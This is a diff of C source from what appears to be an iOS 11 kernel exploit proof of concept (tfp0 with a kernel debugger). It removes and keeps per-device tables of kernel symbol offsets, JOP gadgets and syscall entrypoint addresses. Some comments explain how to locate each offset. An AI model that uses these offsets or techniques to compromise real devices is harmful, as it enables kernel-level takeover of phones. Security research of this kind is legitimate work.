@@ -64,29 +64,6 @@ uint64_t kernel_base = 0;
 uint64_t* symbols = NULL;
 uint64_t kaslr_slide = 0;
 
-// ip x
-uint64_t ksymbols_iphone_x_15B202[] = {
-  0xfffffff0074f9948, // KSYMBOL_OSARRAY_GET_META_CLASS,
-  0xfffffff00758b03c, // KSYMBOL_IOUSERCLIENT_GET_META_CLASS
-  0xfffffff00758c7b0, // KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX
-  0xfffffff007400974, // KSYMBOL_CSBLOB_GET_CD_HASH
-  0xfffffff00710232c, // KSYMBOL_KALLOC_EXTERNAL
-  0xfffffff00710235c, // KSYMBOL_KFREE
-  0xfffffff007102358, // KYSMBOL_RET
-  0xfffffff007513324, // KSYMBOL_OSSERIALIZER_SERIALIZE,
-  0xfffffff0075b2694, // KSYMBOL_KPRINTF
-  0xfffffff00751e1d8, // KSYMBOL_UUID_COPY
-  0xfffffff0075d6000, // KSYMBOL_CPU_DATA_ENTRIES
-  0xfffffff0070cc1d4, // KSYMBOL_VALID_LINK_REGISTER
-  0xfffffff0070cc1ac, // KSYMBOL_X21_JOP_GADGET
-  0xfffffff0070cc474, // KSYMBOL_EXCEPTION_RETURN
-  0xfffffff0070cc42c, // KSYMBOL_THREAD_EXCEPTION_RETURN
-  0xfffffff0071e8630, // KSYMBOL_SET_MDSCR_EL1_GADGET
-  0xfffffff007454194, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // this is actually 1 instruction in to the entrypoint
-  0xfffffff0071e451c, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP
-  0xfffffff0071e4ed8, // KSYMBOL_SLEH_SYNC_EPILOG
-};
-
 // ip7
 uint64_t ksymbols_iphone_7_15B202[] = {
   0xfffffff0074d74cc, // KSYMBOL_OSARRAY_GET_META_CLASS,
@@ -130,28 +107,6 @@ uint64_t ksymbols_ipod_touch_6g_15b202[] = {
   0xFFFFFFF0074062F4, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // look for references to enosys to find the syscall table (this is actually 1 instruction in to the entrypoint)
   0xFFFFFFF0071A90C0, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP  // look for xrefs to "ESR (0x%x) for instruction trapped" and find switch case 49
   0xFFFFFFF0071A9ABC, // KSYMBOL_SLEH_SYNC_EPILOG         // look for xrefs to "Unsupported Class %u event code."
-};
-
-uint64_t ksymbols_ipad_air_2_wifi_15b202[] = {
-    0xFFFFFFF0074A4A5C, // KSYMBOL_OSARRAY_GET_META_CLASS,
-    0xFFFFFFF007533D08, // KSYMBOL_IOUSERCLIENT_GET_META_CLASS
-    0xfffffff0075354b0, // KSYMBOL_IOUSERCLIENT_GET_TARGET_AND_TRAP_FOR_INDEX
-    0xfffffff0073b71f4, // KSYMBOL_CSBLOB_GET_CD_HASH
-    0xfffffff0070c8710, // KSYMBOL_KALLOC_EXTERNAL
-    0xfffffff0070c8740, // KSYMBOL_KFREE
-    0xfffffff0070c873c, // KYSMBOL_RET
-    0xfffffff0074be988, // KSYMBOL_OSSERIALIZER_SERIALIZE,
-    0xfffffff007559fe0, // KSYMBOL_KPRINTF
-    0xfffffff0074c9920, // KSYMBOL_UUID_COPY
-    0xFFFFFFF00757E000, // KSYMBOL_CPU_DATA_ENTRIES         // 0x6000 in to the data segment
-    0xFFFFFFF00709818C, // KSYMBOL_VALID_LINK_REGISTER      // look for reference to  FAR_EL1 (Fault Address Register (EL1))
-    0xFFFFFFF007098164, // KSYMBOL_X21_JOP_GADGET           // look for references to FPCR (Floating-point Control Register)
-    0xFFFFFFF007098434, // KSYMBOL_EXCEPTION_RETURN         // look for references to Set PSTATE.DAIF [--IF]
-    0xFFFFFFF0070983E4, // KSYMBOL_THREAD_EXCEPTION_RETURN  // a bit before exception_return
-    0xfffffff0071ad154, // KSYMBOL_SET_MDSCR_EL1_GADGET     // look for references to MDSCR_EL1
-    0xfffffff007406304, // KSYMBOL_WRITE_SYSCALL_ENTRYPOINT // look for references to enosys to find the syscall table (this is actually 1 instruction in to the entrypoint)
-    0xFFFFFFF0071A90D0, // KSYMBOL_EL1_HW_BP_INFINITE_LOOP  // look for xrefs to "ESR (0x%x) for instruction trapped" and find switch case 49
-    0xfffffff0071a9acc, // KSYMBOL_SLEH_SYNC_EPILOG         // look for xrefs to "Unsupported Class %u event code."
 };
 
 uint64_t ksymbols_iphone_6s_15b202[] = {
@@ -231,26 +186,14 @@ void offsets_init() {
     printf("this is iPod Touch 6G, should work!\n");
     symbols = ksymbols_ipod_touch_6g_15b202;
     have_syms = 1;
-  } else if (strstr(u.machine, "iPhone7,2") || strstr(u.machine, "iPhone7,1")) {
-      printf("this is iPhone 6/6+, should work!\n");
-      symbols = ksymbols_ipod_touch_6g_15b202;
-      have_syms = 1;
-  } else if (strstr(u.machine, "iPad5,3")){
-      printf("this is iPad Air 2 [WiFi], should work!\n");
-      symbols = ksymbols_ipad_air_2_wifi_15b202;
-      have_syms = 1;
-  } else if (strstr(u.machine, "iPhone8,1") || strstr(u.machine, "iPhone8,2")) {
-      printf("this is iPhone 6s/6s+, should work!\n");
-      symbols = ksymbols_iphone_6s_15b202;
-      have_syms = 1;
-  } else if (strstr(u.machine, "iPhone9,3") || strstr(u.machine, "iPhone9,4")) {
-    printf("this is iPhone 7/7+, should work!\n");
+  } else if (strstr(u.machine, "iPhone9,3")) {
+    printf("this is iPhone 7, should work!\n");
     symbols = ksymbols_iphone_7_15B202;
     have_syms = 1;
-  } else if (strstr(u.machine, "iPhone10,6")) {
-      printf("this is iPhone X, should work!\n");
-      symbols = ksymbols_iphone_x_15B202;
-      have_syms = 1;
+  } else if (strstr(u.machine, "iPhone8,1")) {
+    printf("this is iPhone 6s, should work!\n");
+    symbols = ksymbols_iphone_6s_15b202;
+    have_syms = 1;
   } else {
     printf("no symbols for this device yet\n");
     printf("tfp0 should still work, but the kernel debugger PoC won't\n");
